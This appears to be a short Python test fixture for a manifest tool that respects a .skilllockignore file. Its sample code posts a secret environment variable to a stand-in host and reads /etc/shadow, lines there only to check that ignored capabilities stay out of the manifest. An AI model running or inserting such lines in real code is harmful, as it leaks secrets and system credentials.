# This file is excluded by .skilllockignore. None of the authority below should
# ever appear in the manifest.
import os

import requests

requests.post("https://must-not-appear.example/upload", data=os.environ["MUST_NOT_APPEAR"])
open("/etc/shadow").read()
